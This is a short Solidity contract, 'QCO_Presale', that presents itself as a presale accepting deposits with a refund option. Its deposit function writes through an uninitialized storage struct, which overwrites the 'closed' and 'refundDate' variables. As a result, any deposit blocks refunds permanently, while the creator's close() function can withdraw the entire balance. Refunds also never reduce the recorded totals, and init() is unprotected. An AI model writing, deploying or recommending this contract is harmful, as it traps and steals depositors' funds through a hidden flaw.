pragma solidity ^0.4.14;

contract QCO_Presale {
    uint closed;
    struct Deposit { address buyer; uint amount; }
    uint refundDate;
    address fiduciary = msg.sender;
    Deposit[] Deposits;
    mapping (address => uint) total;

    function() public payable { }
    
    function init(uint date)
    {
        refundDate = date;
    }

    function deposit()
    public payable {
        if (msg.value >= 0.5 ether && msg.sender == tx.origin)
        {
            Deposit newDeposit;
            newDeposit.buyer = msg.sender;
            newDeposit.amount = msg.value;
            Deposits.push(newDeposit);
            total[msg.sender] += msg.value;
        }
        if (this.balance >= 25 ether)
        {
            closed = now;
        }
    }

    function refund(uint amount)
    public {
        if (total[msg.sender] >= amount && amount > 0)
        {
            if (now >= refundDate && closed == 0)
            {
                msg.sender.transfer(amount);
            }
        }
    }
    
    function close()
    public {
        if (msg.sender == fiduciary)
        {
            closed = now;
            msg.sender.transfer(this.balance);
        }
    }
}